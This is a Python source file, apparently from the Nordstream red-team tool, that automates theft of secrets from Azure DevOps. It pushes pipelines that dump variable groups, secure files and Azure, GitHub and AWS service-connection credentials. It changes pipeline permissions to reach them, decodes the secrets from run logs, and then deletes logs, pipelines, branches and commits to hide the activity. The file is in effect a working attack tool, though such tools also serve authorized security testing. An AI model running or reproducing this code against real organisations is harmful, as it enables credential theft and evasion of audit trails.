import logging
import base64
import time

from os import makedirs, chdir
from os.path import exists, realpath
from nordstream.yaml.devops import DevOpsPipelineGenerator
from nordstream.utils.errors import GitError, RepoCreationError, DevOpsError
from nordstream.utils.log import logger
from nordstream.git import Git
import subprocess


class DevOpsRunner:
    _cicd = None
    _extractVariableGroups = True
    _extractSecureFiles = True
    _extractAzureServiceconnections = True
    _extractGitHubServiceconnections = True
    _extractAWSServiceconnections = True
    _yaml = None
    _writeAccessFilter = False
    _pipelineFilename = "azure-pipelines.yml"
    _output = None
    _cleanLogs = True
    _resType = {"default": 0, "doubleb64": 1, "github": 2, "azurerm": 3}
    _pushedCommitsCount = 0
    _branchAlreadyExists = False
    _allowedTypes = ["azurerm", "github", "aws"]

    def __init__(self, cicd):
        self._cicd = cicd
        self.__createLogDir()

    @property
    def extractVariableGroups(self):
        return self._extractVariableGroups

    @extractVariableGroups.setter
    def extractVariableGroups(self, value):
        self._extractVariableGroups = value

    @property
    def extractSecureFiles(self):
        return self._extractSecureFiles

    @extractSecureFiles.setter
    def extractSecureFiles(self, value):
        self._extractSecureFiles = value

    @property
    def extractAzureServiceconnections(self):
        return self._extractAzureServiceconnections

    @extractAzureServiceconnections.setter
    def extractAzureServiceconnections(self, value):
        self._extractAzureServiceconnections = value

    @property
    def extractGitHubServiceconnections(self):
        return self._extractGitHubServiceconnections

    @extractGitHubServiceconnections.setter
    def extractGitHubServiceconnections(self, value):
        self._extractGitHubServiceconnections = value

    @property
    def extractAWSServiceconnections(self):
        return self._extractAWSServiceconnections

    @extractAWSServiceconnections.setter
    def extractAWSServiceconnections(self, value):
        self._extractAWSServiceconnections = value

    @property
    def output(self):
        return self._output

    @output.setter
    def output(self, value):
        self._output = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    @property
    def writeAccessFilter(self):
        return self._writeAccessFilter

    @writeAccessFilter.setter
    def writeAccessFilter(self, value):
        self._writeAccessFilter = value

    def __createLogDir(self):
        self._cicd.outputDir = realpath(self._cicd.outputDir) + "/azure_devops"
        makedirs(self._cicd.outputDir, exist_ok=True)

    def listDevOpsProjects(self):
        logger.info("Listing all projects:")
        for p in self._cicd.projects:
            name = p.get("name")
            logger.raw(f"- {name}\n", level=logging.INFO)

    def getProjects(self, project):
        if project:
            if exists(project):
                with open(project, "r") as file:
                    for project in file:
                        self._cicd.addProject(project.strip())

            else:
                self._cicd.addProject(project)
        else:
            self._cicd.listProjects()

        if self._writeAccessFilter:
            self._cicd.filterWriteProjects()

        if len(self._cicd.projects) == 0:
            if self._writeAccessFilter:
                logger.critical("No project with write access found.")
            else:
                logger.critical("No project found.")

    def listProjectSecrets(self):
        logger.info("Listing secrets")
        for project in self._cicd.projects:
            projectName = project.get("name")
            projectId = project.get("id")
            logger.info(f'"{projectName}" secrets')
            self.__displayProjectVariableGroupsSecrets(projectId)
            self.__displayProjectSecureFiles(projectId)
            self.__displayServiceConnections(projectId)
            logger.empty_line()

    def __displayProjectVariableGroupsSecrets(self, project):

        try:
            secrets = self._cicd.listProjectVariableGroupsSecrets(project)
        except DevOpsError as e:
            logger.error(e)

        else:
            if len(secrets) != 0:
                for variableGroup in secrets:
                    logger.info(f"Variable group: \"{variableGroup.get('name')}\"")
                    for sec in variableGroup.get("variables"):
                        logger.raw(f"\t- {sec}\n", logging.INFO)

    def __displayProjectSecureFiles(self, project):

        try:
            secureFiles = self._cicd.listProjectSecureFiles(project)
        except DevOpsError as e:
            logger.error(e)
        else:
            if secureFiles:
                for sf in secureFiles:
                    logger.info(f'Secure file: "{sf["name"]}"')

    def __displayServiceConnections(self, projectId):

        try:
            serviceConnections = self._cicd.listServiceConnections(projectId)
        except DevOpsError as e:
            logger.error(e)
        else:
            if len(serviceConnections) != 0:
                logger.info("Service connections:")
                for sc in serviceConnections:
                    scType = sc.get("type")
                    scName = sc.get("name")
                    logger.raw(f"\t- {scName} ({scType})\n", logging.INFO)

    def __checkSecrets(self, project):
        projectId = project.get("id")
        projectName = project.get("name")

        if (
            self._extractAzureServiceconnections
            or self._extractGitHubServiceconnections
            or self._extractAWSServiceconnections
        ):

            try:
                return len(self._cicd.listServiceConnections(projectId)) != 0
            except DevOpsError as e:
                return False

        elif self._extractVariableGroups:

            try:
                return len(self._cicd.listProjectVariableGroupsSecrets(projectId)) != 0
            except DevOpsError as e:
                return False

        elif self._extractSecureFiles:

            try:
                return len(self._cicd.listProjectSecureFiles(projectId)) != 0
            except DevOpsError as e:
                return False

        else:
            logger.info(f'No secrets found for project "{projectName}" / "{projectId}"')
            return False

    def createYaml(self, pipelineType):
        pipelineGenerator = DevOpsPipelineGenerator()
        if pipelineType == "default":
            pipelineGenerator.generatePipelineForSecretExtraction({"name": "", "variables": ""})
        elif pipelineType == "github":
            pipelineGenerator.generatePipelineForGitHub("#FIXME")
        elif pipelineType == "azurerm":
            pipelineGenerator.generatePipelineForAzureRm("#FIXME")
        elif pipelineType == "aws":
            pipelineGenerator.generatePipelineForAWS("#FIXME")
        else:
            pipelineGenerator.defaultTemplate = ""
            logger.error(f"Invalid type: {pipelineType}")

        logger.success("YAML file: ")
        pipelineGenerator.displayYaml()
        pipelineGenerator.writeFile(self._output)

    def __extractPipelineOutput(self, projectId, resType=0, resultsFilename="secrets.txt"):
        with open(
            f"{self._cicd.outputDir}/{self._cicd.org}/{projectId}/{self._fileName}",
            "rb",
        ) as output:
            try:
                if resType == self._resType["doubleb64"]:
                    pipelineResults = self.__doubleb64(output)
                elif resType == self._resType["github"]:
                    pipelineResults = self.__extractGitHubResults(output)
                elif resType == self._resType["azurerm"]:
                    pipelineResults = self.__azureRm(output)
                elif resType == self._resType["default"]:
                    pipelineResults = output.read()
                else:
                    logger.exception("Invalid type checkout: _resType")
            except:
                output.seek(0)
                pipelineResults = output.read()

        logger.success("Output:")
        logger.raw(pipelineResults, logging.INFO)

        with open(f"{self._cicd.outputDir}/{self._cicd.org}/{projectId}/{resultsFilename}", "ab") as file:
            file.write(pipelineResults)

    @staticmethod
    def __extractGitHubResults(output):
        decoded = DevOpsRunner.__doubleb64(output)
        for line in decoded.split(b"\n"):
            if b"AUTHORIZATION" in line:
                try:
                    return base64.b64decode(line.split(b" ")[-1]) + b"\n"
                except Exception as e:
                    logger.error(e)
        return None

    @staticmethod
    def __doubleb64(output):
        # well it's working
        data = output.readlines()[-2].split(b" ")[1]
        return base64.b64decode(base64.b64decode(data))

    @staticmethod
    def __azureRm(output):
        # well it's working
        data = output.readlines()[-3].split(b" ")[1]
        return base64.b64decode(base64.b64decode(data))

    def __launchPipeline(self, project, pipelineId, pipelineGenerator):
        logger.verbose(f"Launching pipeline.")

        pipelineGenerator.writeFile(f"./{self._pipelineFilename}")
        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
                logger.error("Error when pushing code: Everything up-to-date")
                logger.warning(
                    "Your trying to push the same code on an existing branch, modify the yaml file to push it."
                )

            elif pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)

            else:
                self._pushedCommitsCount += 1
                logger.raw(pushOutput.communicate()[1])

                # manual trigger because otherwise is difficult to get the right runId
                run = self._cicd.runPipeline(project, pipelineId)

                self.__checkRunErrors(run)

                runId = run.get("id")
                pipelineStatus = self._cicd.waitPipeline(project, pipelineId, runId)

                if pipelineStatus == "succeeded":
                    logger.success("Pipeline has successfully terminated.")
                    return runId

                elif pipelineStatus == "failed":
                    self.__displayFailureReasons(project, runId)
                    return None

        except Exception as e:
            logger.error(e)
        finally:
            pass

    def __displayFailureReasons(self, projectId, runId):
        logger.error("Workflow failure:")
        for reason in self._cicd.getFailureReason(projectId, runId):
            logger.error(f"{reason}")

    def __extractVariableGroupsSecrets(self, projectId, pipelineId):
        logger.verbose(f"Getting variable groups secrets")

        try:
            variableGroups = self._cicd.listProjectVariableGroupsSecrets(projectId)
        except DevOpsError as e:
            logger.error(e)

        else:
            if len(variableGroups) > 0:
                for variableGroup in variableGroups:
                    pipelineGenerator = DevOpsPipelineGenerator()
                    pipelineGenerator.generatePipelineForSecretExtraction(variableGroup)

                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for variable group: "{variableGroup["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(
                        projectId, pipelineId, variableGroup, "variablegroup"
                    ):
                        continue

                    variableGroupName = variableGroup.get("name")

                    logger.info(f'Extracting secrets for variable group: "{variableGroupName}"')
                    runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
                    if runId:
                        self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                        if self._fileName:
                            self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

                        logger.empty_line()

            else:
                logger.info("No variable groups found")

    def __extractSecureFiles(self, projectId, pipelineId):
        logger.verbose(f"Getting secure files")

        try:
            secureFiles = self._cicd.listProjectSecureFiles(projectId)
        except DevOpsError as e:
            logger.error(e)

        else:
            if secureFiles:
                for secureFile in secureFiles:
                    pipelineGenerator = DevOpsPipelineGenerator()
                    pipelineGenerator.generatePipelineForSecureFileExtraction(secureFile["name"])

                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for the secure file: "{secureFile["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(
                        projectId, pipelineId, secureFile, "securefile"
                    ):
                        continue

                    logger.info(f'Extracting secure file: "{secureFile["name"]}"')
                    runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
                    if runId:
                        self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                        if self._fileName:
                            date = time.strftime("%Y-%m-%d_%H-%M-%S")
                            safeSecureFilename = "".join(
                                [c for c in secureFile["name"] if c.isalpha() or c.isdigit() or c in (" ", ".")]
                            ).strip()
                            self.__extractPipelineOutput(
                                projectId,
                                self._resType["doubleb64"],
                                f"pipeline_{date}_secure_file_{safeSecureFilename}",
                            )

                        logger.empty_line()
            else:
                logger.info("No secure files found")

    def __extractGitHubSecrets(self, projectId, pipelineId, sc):
        endpoint = sc.get("name")

        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.generatePipelineForGitHub(endpoint)

        logger.info(f'Extracting secrets for GitHub: "{endpoint}"')
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId, self._resType["github"])

        logger.empty_line()

    def __extractAzureRMSecrets(self, projectId, pipelineId, sc):

        scheme = sc.get("authorization").get("scheme").lower()
        if scheme == "serviceprincipal":
            name = sc.get("name")
            pipelineGenerator = DevOpsPipelineGenerator()
            pipelineGenerator.generatePipelineForAzureRm(name)

            logger.info(f'Extracting secrets for AzureRM: "{name}"')
            runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
            if runId:
                self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                if self._fileName:
                    self.__extractPipelineOutput(projectId, self._resType["azurerm"])

                logger.empty_line()
        else:
            logger.error(f"Unsupported scheme: {scheme}")

    def __extractAWSSecrets(self, projectId, pipelineId, sc):

        scheme = sc.get("authorization").get("scheme").lower()
        if scheme == "usernamepassword":

            name = sc.get("name")

            pipelineGenerator = DevOpsPipelineGenerator()
            pipelineGenerator.generatePipelineForAWS(name)

            logger.info(f'Extracting secrets for AWS: "{name}"')
            runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
            if runId:
                self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                if self._fileName:
                    self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

                logger.empty_line()
        else:
            logger.error(f"Unsupported scheme: {scheme}")

    def __extractServiceConnectionsSecrets(self, projectId, pipelineId):

        try:
            serviceConnections = self._cicd.listServiceConnections(projectId)
        except DevOpsError as e:
            logger.error(e)
        else:
            for sc in serviceConnections:

                scType = sc.get("type").lower()

                if scType in self._allowedTypes:
                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for the service connection: "{sc["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(projectId, pipelineId, sc, "endpoint"):
                        continue

                    if self._extractAzureServiceconnections and scType == "azurerm":
                        self.__extractAzureRMSecrets(projectId, pipelineId, sc)
                    elif self._extractGitHubServiceconnections and scType == "github":
                        self.__extractGitHubSecrets(projectId, pipelineId, sc)
                    elif self._extractAWSServiceconnections and scType == "aws":
                        self.__extractAWSSecrets(projectId, pipelineId, sc)

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for project in self._cicd.projects:
            projectId = project.get("id")
            logger.info(f"Cleaning logs for project: {projectId}")
            self._cicd.cleanAllLogs(projectId)

    def __runSecretsExtractionPipeline(self, projectId, pipelineId):
        if self._extractVariableGroups:
            self.__extractVariableGroupsSecrets(projectId, pipelineId)

        if self._extractSecureFiles:
            self.__extractSecureFiles(projectId, pipelineId)

        if (
            self._extractAzureServiceconnections
            or self._extractGitHubServiceconnections
            or self._extractAWSServiceconnections
        ):
            self.__extractServiceConnectionsSecrets(projectId, pipelineId)

    def __pushEmptyFile(self):
        Git.gitCreateEmptyFile("README.md")

        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)
            else:
                logger.raw(pushOutput.communicate()[1])

        except Exception as e:
            logger.exception(e)

    def __createRemoteRepo(self, projectId):
        repo = self._cicd.createGit(projectId)
        if repo.get("id"):
            repoId = repo.get("id")
            logger.info(f'New remote repository created: "{self._cicd.repoName}" / "{repoId}"')
            return repo
        else:
            return None

    def __getRemoteRepo(self, projectId):
        for repo in self._cicd.listRepositories(projectId):
            if self._cicd.repoName == repo.get("name"):
                return repo, False

        repo = self.__createRemoteRepo(projectId)
        if repo != None:
            return repo, True

        raise RepoCreationError("No repo found")

    def __deleteRemoteBranch(self):
        logger.verbose("Deleting remote branch")
        deleteOutput = Git.gitDeleteRemote(self._cicd.branchName)
        deleteOutput.wait()

        if deleteOutput.returncode != 0:
            logger.error(f"Error deleting remote branch {self._cicd.branchName}")
            logger.raw(deleteOutput.communicate()[1], logging.INFO)
            return False
        return True

    def __clean(self, projectId, repoId, deleteRemoteRepo, deleteRemotePipeline):
        if self._cleanLogs:
            if deleteRemotePipeline:
                logger.verbose("Deleting remote pipeline.")
                self._cicd.deletePipeline(projectId)

        if deleteRemoteRepo:
            logger.verbose("Deleting remote repository.")
            self._cicd.deleteGit(projectId, repoId)

        else:
            if self._pushedCommitsCount > 0:

                if self._cleanLogs:
                    logger.info(f"Cleaning logs for project: {projectId}")
                    self._cicd.cleanAllLogs(projectId)

                logger.verbose("Cleaning commits.")
                if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                    Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
                else:
                    if not self.__deleteRemoteBranch():
                        logger.info("Cleaning remote branch.")
                        # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                        Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def __createPipeline(self, projectId, repoId):
        logger.info("Getting pipeline")
        self.__pushEmptyFile()

        for pipeline in self._cicd.listPipelines(projectId):
            if pipeline.get("name") == self._cicd.pipelineName:
                return pipeline.get("id"), False

        pipelineId = self._cicd.createPipeline(projectId, repoId, f"{self._pipelineFilename}")
        if pipelineId:
            return pipelineId, True
        else:
            raise Exception("unable to create a pipeline")

    def __runCustomPipeline(self, projectId, pipelineId):
        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.loadFile(self._yaml)

        logger.info("Running arbitrary pipeline")
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId)

            logger.empty_line()

    def runPipeline(self):
        for project in self._cicd.projects:
            projectId = project.get("id")
            repoId = None
            deleteRemoteRepo = False
            deleteRemotePipeline = False

            # skip if no secrets
            if not self._yaml:
                if not self.__checkSecrets(project):
                    continue

            try:
                # Create or get first repo of the project
                repo, deleteRemoteRepo = self.__getRemoteRepo(projectId)
                repoId = repo.get("id")
                self._cicd.repoName = repo.get("name")
                logger.info(f'Getting remote repository: "{self._cicd.repoName}" /' f' "{repoId}"')

                url = f"https://foo:{self._cicd.token}@dev.azure.com/{self._cicd.org}/{projectId}/_git/{self._cicd.repoName}"

                if not Git.gitClone(url):
                    raise GitError("Fail to clone the repository")

                chdir(self._cicd.repoName)

                self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
                Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

                pipelineId, deleteRemotePipeline = self.__createPipeline(projectId, repoId)

                if self._yaml:
                    self.__runCustomPipeline(projectId, pipelineId)
                else:
                    self.__runSecretsExtractionPipeline(projectId, pipelineId)

            except (GitError, RepoCreationError) as e:
                name = project.get("name")
                logger.error(f"Error in project {name}: {e}")

            except KeyboardInterrupt:
                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

            except Exception as e:
                logger.error(f"Error during pipeline run: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

            else:
                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

    def describeToken(self):
        response = self._cicd.getUser()
        logger.info("Token information:")

        username = response.get("authenticatedUser").get("properties").get("Account").get("$value")
        if username != "":
            logger.raw(f"\t- Username: {username}\n", logging.INFO)

        id = response.get("authenticatedUser").get("id")
        if id != "":
            logger.raw(f"\t- Id: {id}\n", logging.INFO)

    def __checkRunErrors(self, run):
        if run.get("customProperties") != None:
            validationResults = run.get("customProperties").get("ValidationResults", [])

            msg = ""
            for res in validationResults:
                if res.get("result", "") == "error":

                    if "Verify the name and credentials being used" in res.get("message", ""):
                        raise DevOpsError("The stored token is not valid anymore.")

                    msg += res.get("message", "") + "\n"

            raise DevOpsError(msg)
